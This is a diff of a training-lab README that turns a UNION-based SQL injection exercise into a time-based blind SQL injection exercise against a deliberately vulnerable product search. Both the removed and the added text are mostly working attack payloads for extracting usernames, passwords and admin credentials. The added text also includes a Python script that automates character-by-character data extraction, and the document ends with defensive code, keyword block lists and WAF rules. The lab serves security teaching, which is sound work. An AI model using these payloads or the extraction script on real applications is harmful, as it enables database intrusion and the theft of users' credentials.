@@ -1,4 +1,4 @@
-# UNION Attack: Retrieving Multiple Values in a Single Column
+# Blind SQL Injection with Time Delays and Information Retrieval
 
 ## **What is SQL?**
 
@@ -6,466 +6,320 @@ SQL, or Structured Query Language, is a programming language used to manage and 
 
 ![SQL Diagram](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/SQL.drawio.svg)
 
-
-
 SQL is used in various operations such as searching for products in an e-commerce application. The server constructs an SQL query using user input (like a search term) and sends it to the database to retrieve matching records. The results are then presented to the user based on the query's output.
 
-## What is Retrieving Multiple Values in a Single Column?
+## What is Blind SQL Injection with Time Delays?
 
-In many SQL injection UNION attacks, applications only display one or two columns clearly to users, but attackers want to extract multiple pieces of data (username, password, email, etc.) from database tables. The solution is to use **string concatenation** to combine multiple database fields into a single visible column.
+Blind SQL injection occurs when an application is vulnerable to SQL injection, but the HTTP responses do not contain the results of the relevant SQL query or any database errors. **Time-based blind SQL injection** is a technique where attackers use database functions that cause deliberate delays to infer information from the database based on response times.
 
 ### The Challenge for Attackers
 
-When performing UNION attacks, attackers often face limited visibility:
+In blind SQL injection scenarios, attackers face several limitations:
 ```sql
--- Original query shows only 2 columns, but column 2 (title) is the only clearly visible one
-SELECT id, title FROM products WHERE name LIKE '%search%'
+-- Original query returns normal results
+SELECT id, name FROM products WHERE name ILIKE '%search%'
 
--- Problem: You want username AND password AND email, but only one column is visible
-UNION SELECT NULL, username FROM users  -- Only shows username
--- OR
-UNION SELECT NULL, password FROM users  -- Only shows password
+-- Problem: No error messages shown, no data leakage visible
+-- Solution: Use time delays to extract information bit by bit
 
--- Solution: Concatenate multiple values into the single visible column
-UNION SELECT NULL, username||':'||password||':'||email FROM users
--- Shows: "john_doe:password123:john@email.com" in the title field
+-- If condition is TRUE: Response takes 5+ seconds
+laptop' AND (SELECT pg_sleep(5)) IS NULL--
+
+-- If condition is FALSE: Response takes normal time (~100ms)
+laptop' AND 1=2 AND (SELECT pg_sleep(5)) IS NULL--
 ```
 
+### How Time-Based Extraction Works
 
-## Key Requirements for Multiple Value Extraction
+**Normal Response Time:** ~50-200 milliseconds  
+**Delayed Response Time:** ~5000+ milliseconds (when pg_sleep(5) executes)
 
-For successful multiple value extraction, two critical techniques must be mastered:
+By measuring response times, attackers can determine if specific conditions are TRUE or FALSE:
 
-### 1. String Concatenation
-Different databases use different concatenation operators:
-
-**SQLite (this lab):**
 ```sql
-SELECT username||':'||password||':'||email FROM users
--- Result: "john_doe:password123:john@email.com"
+-- Check if database name length is 8 characters
+laptop' AND (SELECT CASE WHEN length(current_database())=8 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
+
+-- If response is delayed (5+ seconds): Database name is 8 characters
+-- If response is quick (~100ms): Database name is NOT 8 characters
+```
+
+## Key Requirements for Time-Based Blind Injection
+
+For successful time-based blind SQL injection, three critical techniques must be mastered:
+
+### 1. Time Delay Functions
+Different databases use different time delay functions:
+
+**PostgreSQL (this lab):**
+```sql
+SELECT pg_sleep(5)  -- Delay for 5 seconds
 ```
 
 **MySQL:**
 ```sql
-SELECT CONCAT(username,':',password,':',email) FROM users
--- Result: "john_doe:password123:john@email.com"
+SELECT SLEEP(5)  -- Delay for 5 seconds
 ```
 
-
-
-### 2. Strategic Delimiter Usage
-Use delimiters to separate different pieces of data for easy reading:
-
-**Common delimiters:**
+**Microsoft SQL Server:**
 ```sql
--- Using colon (:)
-username||':'||password
-
--- Using pipe (|)  
-username||'|'||password
-
--- Using tilde (~)
-username||'~'||password||'~'||email
-
--- Using multiple characters
-username||' :: '||password||' :: '||email
+WAITFOR DELAY '00:00:05'  -- Delay for 5 seconds
 ```
 
+### 2. Conditional Logic
+Use conditional statements to trigger delays based on data:
 
+**PostgreSQL:**
+```sql
+SELECT CASE 
+  WHEN condition_is_true THEN pg_sleep(5)
+  ELSE 0 
+END
+```
+
+### 3. Information Extraction Strategy
+Extract data systematically using binary search or character-by-character extraction:
+
+**Character-by-character extraction:**
+```sql
+-- Extract first character of username
+CASE WHEN substring(username,1,1)='a' THEN pg_sleep(5) ELSE 0 END
+CASE WHEN substring(username,1,1)='b' THEN pg_sleep(5) ELSE 0 END
+-- Continue until delay occurs...
+```
+
+**Binary search approach:**
+```sql
+-- Check if ASCII value > 100 (faster than testing each character)
+CASE WHEN ascii(substring(username,1,1))>100 THEN pg_sleep(5) ELSE 0 END
+```
 
 ## Objective
 
-Learn how to extract multiple database values in a single visible column by:
-1. **Identifying limited visible columns** in the target application
-2. **Using string concatenation** to combine multiple database fields
-3. **Implementing strategic delimiters** for readable data separation
-4. **Extracting comprehensive data sets** from multiple database fields in one attack
+Learn how to exploit blind SQL injection vulnerabilities using time delays by:
+1. **Detecting the vulnerability** using basic time delay payloads
+2. **Confirming database type** and gathering system information
+3. **Extracting database structure** (tables, columns)
+4. **Retrieving sensitive data** character by character
+5. **Automating the extraction process** for efficiency
 
 ## Setup Instructions
 
-### Option 1: Using Docker (Recommended)
+### Option 1: Using Docker Compose (Recommended)
 
-1. **Pull the Docker Image**
-
-   ```bash
-   docker pull yeasin97/sqli-lab06:latest
-   ```
-
-2. **Run the Docker Container**
+1. **Download the Lab Files**
 
    ```bash
-   docker run -d -p 3000:3000 -p 5173:5173 yeasin97/sqli-lab06:latest
+   git clone https://github.com/your-repo/blind-sqli-lab.git
+   cd blind-sqli-lab
    ```
-   
-3. **Create a Load Balancer in Poridhi's Cloud**
 
-   Find the `eth0` IP address with `ifconfig` command:
+2. **Start the Application**
 
    ```bash
-   ifconfig
+   docker-compose up -d
    ```
 
-   ![ipconfig](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/ifconfig.png)
+3. **Verify Services are Running**
 
-   Create a Load Balancer with the `eth0 IP` address and the port `5173`
+   ```bash
+   docker-compose ps
+   ```
 
-   ![loadb](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/loadb.png)
+   You should see:
+   - `blind-sqli-backend` running on port 5000
+   - `blind-sqli-frontend` running on port 5173
+   - `blind-sqli-db` (PostgreSQL) running on port 5432
 
 4. **Access the Web Application**
 
-   Access the web application with the URL provided by the `loadbalancer`
+   Open your browser and navigate to: `http://localhost:5173`
 
-   ![Home](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/home.png)
 
-### Option 2: Local Setup
-
-1. **Clone the Repository**
-
-   ```bash
-   git clone https://github.com/yeasin097/SQLMultiValueLab.git
-   cd SQLMultiValueLab
-   ```
-
-2. **For Windows**: Double Click on the `run.bat` to start the application.
-
-3. **Setup Linux**
-
-   In a new terminal:
-
-   ```bash
-   chmod +x run.sh
-   ./run.sh
-   ```
-
-4. **Access the Application**
-
-   Open your browser and navigate to the URL shown in your terminal (usually `http://localhost:5173`)
 
 ### Project Structure
 
-The application follows a modern separated frontend-backend architecture:
-
 ```
 ├── backend/
-│   ├── package-lock.json
+│   ├── .env.example
 │   ├── package.json
 │   └── server.js
-└── frontend/
-    ├── public/
-    │   └── vite.svg
-    ├── src/
-    │   ├── App.css
-    │   ├── App.jsx
-    │   ├── Home.jsx
-    │   ├── ProductDetail.jsx
-    │   ├── SearchFilter.jsx
-    │   ├── assets/
-    │   │   └── react.svg
-    │   ├── index.css
-    │   └── main.jsx
-    ├── index.html
-    ├── package-lock.json
-    ├── package.json
-    └── vite.config.js
+├── frontend/
+│   ├── src/
+│   │   ├── App.jsx
+│   │   ├── Home.jsx
+│   │   ├── ProductDetail.jsx
+│   │   ├── SearchFilter.jsx
+│   │   ├── App.css
+│   │   └── main.jsx
+│   ├── package.json
+│   └── vite.config.js
+├── db/
+│   └── init.sql
+├── docker-compose.yml
+└── README.md
 ```
 
 ## Understanding the Target Application
 
 ### Normal Application Behavior
-1. **Homepage**: Displays product search results with limited visibility
-2. **Search Filter**: Input box allows searching for products by name
-3. **URL Structure**: `http://localhost:5173/?search=laptop` searches for products
-4. **SQL Query**: Backend executes `SELECT id, name FROM products WHERE name LIKE '%laptop%'`
-5. **Limited Visibility**: Only product names are clearly displayed (2 columns, but only column 2 is visible)
+1. **Homepage**: Displays a product search interface
+2. **Search Function**: Users can search for products by name
+3. **URL Structure**: `http://localhost:3000/?search=laptop` searches for products
+4. **Backend Query**: `SELECT id, name FROM products WHERE name ILIKE '%laptop%'`
+5. **Response Behavior**: Returns matching products in JSON format
+
+### Identifying the Vulnerability
+The search parameter is directly concatenated into the SQL query without proper sanitization, making it vulnerable to SQL injection.
 
 ## Lab Instructions
 
-### Phase 1: Reconnaissance and Limited Visibility Discovery
+### Phase 1: Vulnerability Detection and Basic Time Delays
 
-#### Step 1: Understand the Normal Application
-1. **Browse the product search**
+#### Step 1: Understand Normal Application Behavior
+1. **Browse the application**
    - Visit http://localhost:5173
-   - Notice only product names are displayed prominently
-   - Use the search box to search for "laptop", "phone", etc.
-   - Observe how the URL changes: `?search=laptop`, `?search=phone`, etc.
+   - Use the search box to search for "laptop", "smartphone", etc.
+   - Observe normal response times (~100-500ms)
+   - Notice the URL structure: `?search=laptop`
 
-![Search Laptop](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/searchlaptop.png)
-
-![Search Phone](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/searchphone.png)
-
-2. **Examine the SQL query**
-   - Look at the bottom of the page for "Executed SQL Query"
-   - Notice it returns only 2 columns: `id, name`
-   - Only the `name` column is prominently displayed
-
-![Examine Query](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/examinequery.png)
-
-   - This tells us we have limited visibility for data extraction
-
-#### Step 2: Test for SQL Injection Vulnerability
-Try adding a single quote to break the SQL syntax:
+#### Step 2: Test for Basic SQL Injection
+Try breaking the SQL syntax to confirm injection possibility:
 
 ```
 URL: ?search=laptop'
 ```
 
-**Expected Result**: You should see a database error, confirming the parameter is vulnerable.
+**Expected Result**: Application should handle the error gracefully (no visible error message in blind injection).
 
-![SQL Error](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/sqlerror.png)
-
-#### Step 3: Determine Column Count Using ORDER BY
-The ORDER BY technique helps determine how many columns the original query returns.
-
-**Test systematically:**
+#### Step 3: Confirm Time-Based Injection
+Test basic time delay to confirm the vulnerability:
 
 ```
-?search=laptop' ORDER BY 1--
+?search=laptop' AND (SELECT pg_sleep(5)) IS NULL--
 ```
 
-**What happens**: Orders results by the 1st column. Should work without errors.
+**Expected Result**: 
+- **Normal search**: Response in ~100-500ms
+- **Time injection**: Response in ~5000ms+ (5+ seconds delay)
 
-![Order 1 Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/order1result.png)
+**What happens**: The `pg_sleep(5)` function executes, causing a 5-second delay before the response.
 
-```
-?search=laptop' ORDER BY 2--
-```
-
-**What happens**: Orders by 2nd column. Should work.
-
-![Order 2 Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/order2result.png)
-```
-?search=laptop' ORDER BY 3--
-```
-
-**What happens**: Tries to order by 3rd column. Should fail with error because there are only 2 columns.
-
-![Order 3 Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/order3result.png)
-
-**Key Learning**: Only 2 columns exist, and only column 2 (name) is clearly visible.
-
-#### Step 4: Confirm Column Count with UNION NULL Test
-Once you know there are 2 columns, confirm with a NULL test:
+#### Step 4: Alternative Time Delay Syntax
+Test different working syntaxes:
 
 ```
-?search=laptop' UNION SELECT NULL,NULL--
+?search=laptop' OR (SELECT pg_sleep(5)) IS NULL--
 ```
 
-**Expected Result**: Should display normal products without errors, confirming 2 columns.
+**Expected Result**: Should also cause a 5-second delay, confirming the injection works with different logical operators.
 
-![Null Test Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/nulltest.png)
+### Phase 2: Database Information Gathering
 
-### Phase 2: Single Value Extraction (The Problem)
-
-#### Step 5: Attempt Single Value Extraction
-Try extracting just usernames to see the limitation:
+#### Step 5: Confirm Database Type
+Verify you're working with PostgreSQL:
 
 ```
-?search=laptop' UNION SELECT NULL,username FROM users--
+?search=laptop' AND (SELECT CASE WHEN version() LIKE '%PostgreSQL%' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-**Result**: You can see usernames, but not passwords or emails.
+**Result**: If delayed, confirms PostgreSQL database.
 
-![Username Only](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/usernameonly.png)
-
-**The Problem**: You want to see username AND password AND email, but you can only extract one field at a time in the visible column.
-
-### Phase 3: Multiple Value Extraction (The Solution)
-
-#### Step 6: Basic Concatenation - Username and Password
-Combine username and password using concatenation:
+#### Step 6: Extract Database Name Length
+Determine the length of the current database name:
 
 ```
-?search=laptop' UNION SELECT NULL,username||':'||password FROM users--
+?search=laptop' AND (SELECT CASE WHEN length(current_database())=8 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-**Result**: You should see both username and password separated by colon in the product name field.
+Try different numbers until you get a delay.
 
-![Username Password](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/usernamepassword.png)
-
-#### Step 7: Three Value Extraction - Username, Password, and Email
-Combine three values using concatenation:
+#### Step 7: Extract Database Name Character by Character
+Once you know the length, extract each character:
 
 ```
-?search=laptop' UNION SELECT NULL,username||':'||password||':'||email FROM users--
+?search=laptop' AND (SELECT CASE WHEN substring(current_database(),1,1)='b' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-**Result**: You should see username, password, and email all in one visible field.
+Continue with position 2, 3, etc., and test different characters (a-z, 0-9, _).
 
-![Username Password Email](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/userpassemail.png)
+### Phase 3: Database Structure Enumeration
 
-
-
-#### Step 8: Extract Admin Data with Labels
-Extract admin data with descriptive labels:
+#### Step 8: Check for Target Tables
+Test for existence of common tables:
 
 ```
-?search=laptop' UNION SELECT NULL,'Admin: '||admin_username||' | Pass: '||admin_password||' | Role: '||role FROM admin_users--
+?search=laptop' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users') AND (SELECT pg_sleep(5)) IS NULL--
 ```
 
-**Result**: Admin credentials with clear labels for easy identification.
+**Working Tables to Test:**
+- `users`
+- `admin_users` 
+- `products`
+- `customers`
 
-![Admin Data](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/admindata.png)
-
-#### Step 9: Maximum Data Extraction - All User Information
-Extract all available user information in one query:
+#### Step 9: Count Tables in Database
+Determine how many tables exist:
 
 ```
-?search=laptop' UNION SELECT NULL,'ID:'||id||'|User:'||username||'|Email:'||email||'|Pass:'||password FROM users--
+?search=laptop' AND (SELECT CASE WHEN (SELECT count(*) FROM information_schema.tables WHERE table_schema='public')>3 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-**Result**: Complete user profiles in a single visible column.
+#### Step 10: Extract Table Names
+Once you know tables exist, extract their names:
 
-![Complete User Data](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/maxdata.png)
-
-
-
-## Database Schema Deep Dive
-
-Understanding the target database structure helps craft effective attacks:
-
-### products table (2 columns - limited visibility)
-```sql
-CREATE TABLE products (
-    id INTEGER PRIMARY KEY,        -- Position 1: Not clearly visible
-    name TEXT                      -- Position 2: Clearly visible (target for injection)
-);
+```
+?search=laptop' AND (SELECT CASE WHEN substring((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1)='p' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-### users table (4 columns)
-```sql
-CREATE TABLE users (
-    id INTEGER PRIMARY KEY,
-    username TEXT,                 -- Target for extraction
-    email TEXT,                    -- Target for extraction
-    password TEXT                  -- Sensitive target
-);
+### Phase 4: Data Extraction
+
+#### Step 11: Count Records in Target Tables
+Determine how many users exist:
+
+```
+?search=laptop' AND (SELECT CASE WHEN (SELECT count(*) FROM users)>5 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-### admin_users table (4 columns)
-```sql
-CREATE TABLE admin_users (
-    id INTEGER PRIMARY KEY,
-    admin_username TEXT,           -- High-value target
-    admin_password TEXT,           -- Critical sensitive data
-    role TEXT                      -- Privilege information
-);
+#### Step 12: Extract Column Information
+Find column names in the users table:
+
+```
+?search=laptop' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='password') AND (SELECT pg_sleep(5)) IS NULL--
 ```
 
-## Attack Examples with Detailed Explanations
+**Common columns to test:**
+- `username`
+- `password`
+- `email`
+- `id`
 
-### Basic Concatenation
-```
-?search=laptop' UNION SELECT NULL,username||':'||password FROM users--
-```
-**SQL Executed:**
-```sql
-SELECT id, name FROM products WHERE name LIKE '%laptop' UNION SELECT NULL,username||':'||password FROM users--%'
-```
-**Explanation**: Combines username and password with colon separator in the single visible column.
+#### Step 13: Extract User Data
+Extract usernames character by character:
 
-### Advanced Multi-Value Extraction
 ```
-?search=laptop' UNION SELECT NULL,'User:'||username||'|Email:'||email||'|Pass:'||password FROM users--
-```
-**SQL Executed:**
-```sql
-SELECT id, name FROM products WHERE name LIKE '%laptop' UNION SELECT NULL,'User:'||username||'|Email:'||email||'|Pass:'||password FROM users--%'
-```
-**Result Mapping:**
-- Column 1 (id): NULL → Not displayed
-- Column 2 (name): Concatenated string → Shows as "User:john_doe|Email:john@email.com|Pass:password123"
-
-
-## Prevention and Mitigation
-
-### Primary Defense: Parameterized Queries
-
-**Vulnerable Code:**
-```javascript
-const query = `SELECT id, name FROM products WHERE name LIKE '%${search}%'`;
+?search=laptop' AND (SELECT CASE WHEN substring((SELECT username FROM users LIMIT 1),1,1)='j' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-**Secure Code:**
-```javascript  
-const query = `SELECT id, name FROM products WHERE name LIKE ?`;
-db.all(query, [`%${search}%`], (err, rows) => {
-    // Handle results
-});
+#### Step 14: Extract Password Data
+Once you have usernames, extract passwords:
+
+```
+?search=laptop' AND (SELECT CASE WHEN substring((SELECT password FROM users WHERE username='john_doe'),1,1)='m' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
 
-### Secondary Defenses
+#### Step 15: Extract Admin Data
+Target high-value admin information:
 
-**Input Validation:**
-```javascript
-const search = req.query.search;
-if (search.includes('||') || search.includes('CONCAT')) {
-    return res.status(400).json({error: 'Invalid search term'});
-}
 ```
-
-**Output Limitation:**
-```javascript
-// Limit displayed data length
-const displayName = product.name.length > 50 ? 
-    product.name.substring(0, 50) + '...' : 
-    product.name;
+?search=laptop' AND (SELECT CASE WHEN substring((SELECT admin_password FROM admin_users LIMIT 1),1,1)='a' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
 ```
-
-**Database Function Restrictions:**
-```sql
--- Restrict concatenation functions for application user
-REVOKE EXECUTE ON FUNCTION CONCAT FROM 'app_user'@'localhost';
-```
-
-**Web Application Firewall (WAF) Rules:**
-```
-# Block concatenation attempts
-SecRule ARGS "@rx (?i:\|\||concat|char\()" "block,msg:'SQL Concatenation Attack'"
-```
-
-## Conclusion
-
-This lab provides comprehensive training on extracting multiple database values in a single visible column through SQL injection UNION attacks. By working through the exercises, you've learned:
-
-- How to identify applications with limited data visibility
-- String concatenation techniques for combining multiple database fields
-- Strategic delimiter usage for readable data separation
-- Advanced formatting techniques for maximum data extraction
-- The efficiency and stealth advantages of multiple value extraction
-
----
-
-# Lab 07: Blind SQL Injection with Time Delays and Information Retrieval
-
-## Overview
-This lab demonstrates a time-based blind SQL injection vulnerability in a product search feature. The application uses a PostgreSQL database and has a vulnerable search endpoint that allows attackers to extract information through timing-based techniques.
-
-## Learning Objectives
-- Understand how time-based blind SQL injection works
-- Learn to use timing differences to extract information from a database
-- Practice writing and executing time-based SQL injection payloads
-- Understand the importance of consistent response times in secure applications
-
-## Lab Setup
-1. Ensure Docker and Docker Compose are installed on your system
-2. Clone this repository
-3. Navigate to the lab directory
-4. Run the following command to start the lab:
-   - For Windows: `run.bat`
-   - For Linux/Mac: `./run.sh`
-
-The application will be available at:
-- Frontend: http://localhost:3000
-- Backend API: http://localhost:5000
-
-## Lab Structure
-- `frontend/`: Contains the React frontend application
-- `backend/`: Contains the Node.js backend server
-- `db/`: Contains database initialization scripts
-- `docker-compose.yml`: Docker configuration for the lab environment
 
 ## Database Schema
-The lab uses a PostgreSQL database with the following structure:
+
+Understanding the target database structure:
+
+### products table
 ```sql
 CREATE TABLE products (
     id SERIAL PRIMARY KEY,
@@ -473,15 +327,188 @@ CREATE TABLE products (
 );
 ```
 
-## Security Note
-This lab is intentionally vulnerable and should only be run in a controlled environment. The vulnerabilities demonstrated are for educational purposes only.
+### users table (target for extraction)
+```sql
+CREATE TABLE users (
+    id SERIAL PRIMARY KEY,
+    username VARCHAR(255) UNIQUE NOT NULL,
+    email VARCHAR(255) UNIQUE NOT NULL,
+    password VARCHAR(255) NOT NULL,
+    full_name VARCHAR(255),
+    phone VARCHAR(20)
+);
+```
 
-## Cleanup
-To stop and remove all containers:
-1. Press Ctrl+C in the terminal where the containers are running
-2. Run `docker-compose down` to remove the containers
+### admin_users table (high-value target)
+```sql
+CREATE TABLE admin_users (
+    id SERIAL PRIMARY KEY,
+    admin_username VARCHAR(255) UNIQUE NOT NULL,
+    admin_password VARCHAR(255) NOT NULL,
+    role VARCHAR(50) DEFAULT 'admin',
+    access_level INTEGER DEFAULT 1,
+    secret_key VARCHAR(255)
+);
+```
 
-## Additional Resources
-- OWASP SQL Injection Prevention Cheat Sheet
-- PostgreSQL Documentation
-- Time-based SQL Injection Techniques
+## Working Payload Examples
+
+### Basic Time Delay Testing
+```
+laptop' AND (SELECT pg_sleep(5)) IS NULL--
+laptop' OR (SELECT pg_sleep(5)) IS NULL--
+```
+
+### Boolean Information Extraction
+```
+laptop' AND (SELECT CASE WHEN length(current_database())=8 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
+laptop' AND (SELECT CASE WHEN substring(current_database(),1,1)='b' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
+```
+
+### Table and Data Existence
+```
+laptop' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin_users') AND (SELECT pg_sleep(5)) IS NULL--
+```
+
+### Character-by-Character Data Extraction
+```
+laptop' AND (SELECT CASE WHEN substring((SELECT username FROM users LIMIT 1),1,1)='j' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
+```
+
+## Attack Automation
+
+For efficient data extraction, consider automating the process:
+
+### Python Script Example
+```python
+import requests
+import time
+import string
+
+def test_condition(payload):
+    url = f"http://localhost:3000/?search={payload}"
+    start_time = time.time()
+    response = requests.get(url)
+    end_time = time.time()
+    
+    return (end_time - start_time) > 4  # True if delay > 4 seconds
+
+def extract_data(query_template, max_length=50):
+    result = ""
+    for position in range(1, max_length + 1):
+        found = False
+        for char in string.ascii_letters + string.digits + '_@.-':
+            payload = f"laptop' AND (SELECT CASE WHEN substring({query_template},{position},1)='{char}' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--"
+            if test_condition(payload):
+                result += char
+                found = True
+                break
+        if not found:
+            break
+    return result
+
+# Extract database name
+db_name = extract_data("current_database()")
+print(f"Database name: {db_name}")
+
+# Extract first username
+username = extract_data("(SELECT username FROM users LIMIT 1)")
+print(f"First username: {username}")
+```
+
+## Prevention and Mitigation
+
+### Primary Defense: Parameterized Queries
+
+**Vulnerable Code:**
+```javascript
+const query = `SELECT id, name FROM products WHERE name ILIKE '%${search}%'`;
+```
+
+**Secure Code:**
+```javascript
+const query = 'SELECT id, name FROM products WHERE name ILIKE $1';
+const result = await pool.query(query, [`%${search}%`]);
+```
+
+### Secondary Defenses
+
+**Input Validation:**
+```javascript
+const search = req.query.search;
+if (search && (search.includes('sleep') || search.includes('pg_sleep'))) {
+    return res.status(400).json({error: 'Invalid search term'});
+}
+```
+
+**Query Timeout:**
+```javascript
+const pool = new Pool({
+    // ... other config
+    statement_timeout: 1000,  // 1 second timeout
+    query_timeout: 1000
+});
+```
+
+**Response Time Masking:**
+```javascript
+const startTime = Date.now();
+// Execute query
+const endTime = Date.now();
+const executionTime = endTime - startTime;
+
+// Always delay to minimum time to mask timing differences
+const minResponseTime = 500;
+if (executionTime < minResponseTime) {
+    await new Promise(resolve => setTimeout(resolve, minResponseTime - executionTime));
+}
+```
+
+**Web Application Firewall (WAF) Rules:**
+```
+# Block time delay functions
+SecRule ARGS "@rx (?i:pg_sleep|sleep|waitfor|delay)" "block,msg:'SQL Time Delay Attack'"
+
+# Block SQL injection patterns
+SecRule ARGS "@rx (?i:union|select|case\s+when)" "block,msg:'SQL Injection Attempt'"
+```
+
+### Database-Level Protection
+```sql
+-- Limit query execution time
+ALTER DATABASE your_database SET statement_timeout = '5s';
+
+-- Revoke access to timing functions for application user
+REVOKE EXECUTE ON FUNCTION pg_sleep(double precision) FROM app_user;
+```
+
+## Performance Impact and Detection
+
+### Response Time Analysis
+- **Normal queries**: 50-200ms
+- **Time-based attacks**: 5000ms+ per payload
+- **Detection threshold**: Queries taking >1000ms consistently
+
+### Logging and Monitoring
+```javascript
+// Log suspicious timing patterns
+if (executionTime > 1000) {
+    console.warn(`Suspicious slow query detected: ${query}, Time: ${executionTime}ms, IP: ${req.ip}`);
+}
+```
+
+## Conclusion
+
+This lab provides comprehensive training on blind SQL injection with time delays, teaching you to:
+
+- Detect blind SQL injection vulnerabilities using time-based techniques
+- Extract database information systematically without visible output
+- Use PostgreSQL-specific functions for time-based attacks
+- Understand the relationship between response times and data extraction
+- Implement proper defenses against time-based blind SQL injection
+
+Blind SQL injection with time delays is a powerful technique that allows attackers to extract sensitive information even when applications don't display error messages or query results. Understanding these techniques is crucial for both penetration testing and building secure applications.
+
+---
+
+**Important Note**: This lab is for educational purposes only. Never attempt these techniques on systems you don't own or don't have explicit permission to test.
